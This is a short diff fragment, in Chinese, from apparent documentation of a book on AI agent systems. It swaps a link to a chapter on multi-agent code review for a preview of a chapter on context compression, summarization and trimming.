-[第 7 章：code-review - 多 Agent 协作审查](/docs/part3/chapter07) - 学习多 Agent 协作的编排模式，理解验证子 Agent 的机制。
+下一章我们继续往下走，专门看上下文为什么会失控，以及一个 Agent 系统该怎样处理压缩、摘要、裁剪和信息保真这几个麻烦问题。
